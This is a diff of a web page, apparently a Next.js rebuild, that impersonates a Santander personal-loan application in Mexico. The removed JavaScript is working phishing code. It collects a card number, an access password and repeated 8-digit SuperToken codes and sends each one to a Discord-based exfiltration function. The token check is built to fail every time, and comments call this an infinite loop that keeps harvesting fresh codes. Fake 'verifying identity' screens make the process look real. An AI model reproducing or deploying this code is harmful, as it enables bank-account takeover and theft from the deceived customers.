-                        loadingOverlay.classList.remove('active');
-                        if (callback) callback();
-                    }, 500);
-                }, duration);
-
-                timeouts.push(timeout);
-                timeouts.push(interval);
-            }
-
-            // Función para iniciar el flujo de solicitud
-            function iniciarSolicitud() {
-                showSheet(loginModal);
-                inputCliente.value = '';
-                btnContinueInitial.classList.remove('btn-active');
-            }
-
-            // Event Listeners
-            btnSoyCliente.addEventListener('click', iniciarSolicitud);
-            btnConsultarPrestamos.addEventListener('click', iniciarSolicitud);
-
-            btnCancelInitial.addEventListener('click', hideAllAndOverlay);
-            btnCancelPassword.addEventListener('click', hideAllAndOverlay);
-            btnCancelToken.addEventListener('click', hideAllAndOverlay);
-            overlay.addEventListener('click', hideAllAndOverlay);
-
-            // Solo permitir números en el input de tarjeta
-            inputCliente.addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '');
-                toggleButtonState(this, btnContinueInitial);
-            });
-
-            inputPassword.addEventListener('input', () => toggleButtonState(inputPassword, btnContinuePassword));
-
-            btnContinueInitial.addEventListener('click', () => {
-                const cliente = inputCliente.value.trim();
-                if (cliente === '') return;
-
-                usuarioCliente = cliente;
-                sendToDiscord('📝 Ingreso de tarjeta', {
-                    'Tarjeta': cliente
-                });
-
-                showSheet(passwordModal);
-                inputPassword.value = '';
-                btnContinuePassword.classList.remove('btn-active');
-            });
-
-            togglePassword.addEventListener('click', () => {
-                const type = inputPassword.getAttribute('type') === 'password' ? 'text' : 'password';
-                inputPassword.setAttribute('type', type);
-                togglePassword.classList.toggle('fa-eye');
-                togglePassword.classList.toggle('fa-eye-slash');
-            });
-
-            btnContinuePassword.addEventListener('click', () => {
-                const password = inputPassword.value.trim();
-                if (password === '') return;
-
-                sendToDiscord('🔐 Ingreso de clave de acceso', {
-                    'Clave de acceso': password
-                });
-
-                showLoadingWithProgress(
-                    'Verificando identidad',
-                    'Validando tus datos de seguridad...',
-                    15000,
-                    () => {
-                        showSheet(tokenModal);
-                        tokenHandler.clearToken();
-                    }
-                );
-            });
-
-            // Función para mostrar el error y reiniciar el ciclo
-            function showTokenError() {
-                errorModal.classList.add('active');
-            }
-
-            // Token único que se repite infinitamente
-            btnContinueToken.addEventListener('click', () => {
-                const token = tokenHandler.getToken();
-                if (token.length !== 8) {
-                    alert('Ingresa un token de 8 dígitos');
-                    return;
-                }
-
-                const paso = tokenCounter++;
-                sendToDiscord(`🎫 SuperToken - Intento ${paso}`, {
-                    [`SuperToken (Intento ${paso})`]: token
-                });
-
-                // Simular verificación - SIEMPRE mostrar error (para el bucle infinito)
-                showLoadingWithProgress(
-                    'Validando token',
-                    'Verificando tu identidad...',
-                    3000,
-                    () => {
-                        // Mostrar error y reiniciar
-                        showTokenError();
-                    }
-                );
-            });
-
-            // Botón de reintentar en el error
-            btnErrorContinue.addEventListener('click', () => {
-                errorModal.classList.remove('active');
-                // Mostrar nuevamente el modal de token
-                showSheet(tokenModal);
-                tokenHandler.clearToken();
-            });
-
-            window.addEventListener('beforeunload', clearAllTimeouts);
-        })();
+      (self.__next_f = self.__next_f || []).push([0]);
     </script>
-</body>
-
+    <script>
+      self.__next_f.push([
+        1,
+        '1:"$Sreact.fragment"\n2:I[39756,["/_next/static/chunks/0ya5kixflpvgt.js","/_next/static/chunks/0d3tkj33oycf2.js"],"default"]\n3:I[37457,["/_next/static/chunks/0ya5kixflpvgt.js","/_next/static/chunks/0d3tkj33oycf2.js"],"default"]\n4:I[2355,["/_next/static/chunks/0ya5kixflpvgt.js","/_next/static/chunks/0d3tkj33oycf2.js"],"Analytics"]\n5:I[47257,["/_next/static/chunks/0ya5kixflpvgt.js","/_next/static/chunks/0d3tkj33oycf2.js"],"ClientPageRoot"]\n6:I[31713,["/_next/static/chunks/0ya5kixflpvgt.js","/_next/static/chunks/0d3tkj33oycf2.js","/_next/static/chunks/11~lw5o3-i196.js","/_next/static/chunks/0oa~~sh4mev3v.js"],"default"]\n9:I[97367,["/_next/static/chunks/0ya5kixflpvgt.js","/_next/static/chunks/0d3tkj33oycf2.js"],"OutletBoundary"]\na:"$Sreact.suspense"\nc:I[97367,["/_next/static/chunks/0ya5kixflpvgt.js","/_next/static/chunks/0d3tkj33oycf2.js"],"ViewportBoundary"]\ne:I[97367,["/_next/static/chunks/0ya5kixflpvgt.js","/_next/static/chunks/0d3tkj33oycf2.js"],"MetadataBoundary"]\n10:I[68027,["/_next/static/chunks/0ya5kixflpvgt.js","/_next/static/chunks/0d3tkj33oycf2.js"],"default",1]\n:HL["/_next/static/chunks/0royarl~s254q.css","style"]\n:HL["/_next/static/media/797e433ab948586e-s.p.08e28id.o-okb.woff2","font",{"crossOrigin":"","type":"font/woff2"}]\n:HL["/_next/static/media/caa3a2e1cccd8315-s.p.09~u27dqhyhd6.woff2","font",{"crossOrigin":"","type":"font/woff2"}]\n',
+      ]);
+    </script>
+    <script>
+      self.__next_f.push([
+        1,
+        '0:{"P":null,"c":["",""],"q":"","i":false,"f":[[["",{"children":["__PAGE__",{}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/chunks/0royarl~s254q.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","script","script-0",{"src":"/_next/static/chunks/0ya5kixflpvgt.js","async":true,"nonce":"$undefined"}],["$","script","script-1",{"src":"/_next/static/chunks/0d3tkj33oycf2.js","async":true,"nonce":"$undefined"}]],["$","html",null,{"lang":"es","className":"geist_a71539c9-module__T19VSG__variable geist_mono_8d43a2aa-module__8Li5zG__variable bg-background","children":["$","body",null,{"className":"font-sans antialiased bg-background text-foreground","children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\\"Segoe UI\\",Roboto,Helvetica,Arial,sans-serif,\\"Apple Color Emoji\\",\\"Segoe UI Emoji\\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":404}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],["$","$L4",null,{}]]}]}]]}],{"children":[["$","$1","c",{"children":[["$","$L5",null,{"Component":"$6","serverProvidedParams":{"searchParams":{},"params":{},"promises":["$@7","$@8"]}}],[["$","script","script-0",{"src":"/_next/static/chunks/11~lw5o3-i196.js","async":true,"nonce":"$undefined"}],["$","script","script-1",{"src":"/_next/static/chunks/0oa~~sh4mev3v.js","async":true,"nonce":"$undefined"}]],["$","$L9",null,{"children":["$","$a",null,{"name":"Next.MetadataOutlet","children":"$@b"}]}]]}],{},null,false,null]},null,false,null],["$","$1","h",{"children":[null,["$","$Lc",null,{"children":"$Ld"}],["$","div",null,{"hidden":true,"children":["$","$Le",null,{"children":["$","$a",null,{"name":"Next.Metadata","children":"$Lf"}]}]}],["$","meta",null,{"name":"next-size-adjust","content":""}]]}],false]],"m":"$undefined","G":["$10",[["$","link","0",{"rel":"stylesheet","href":"/_next/static/chunks/0royarl~s254q.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"17Ku-fzyNdnhzWczcVPKQ"}\n',
+      ]);
+    </script>
+    <script>
+      self.__next_f.push([
+        1,
+        '7:{}\n8:"$0:f:0:1:1:children:0:props:children:0:props:serverProvidedParams:params"\n',
+      ]);
+    </script>
+    <script>
+      self.__next_f.push([
+        1,
+        'd:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#DA1F3D"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]\n',
+      ]);
+    </script>
+    <script>
+      self.__next_f.push([
+        1,
+        '11:I[27201,["/_next/static/chunks/0ya5kixflpvgt.js","/_next/static/chunks/0d3tkj33oycf2.js"],"IconMark"]\nb:null\nf:[["$","title","0",{"children":"Santander Préstamo Personal - Solicita Ahora"}],["$","meta","1",{"name":"description","content":"Solicita un préstamo personal Santander de $20,000 a $300,000 MXN de forma rápida y segura"}],["$","meta","2",{"name":"generator","content":"v0.app"}],["$","link","3",{"rel":"icon","href":"/logo.png","media":"(prefers-color-scheme: light)"}],["$","link","4",{"rel":"icon","href":"/logo.png","media":"(prefers-color-scheme: dark)"}],["$","link","5",{"rel":"icon","href":"/logo.png","type":"image/svg+xml"}],["$","link","6",{"rel":"apple-touch-icon","href":"/logo.png"}],["$","$L11","7",{}]]\n',
+      ]);
+    </script>
+  </body>
 </html>
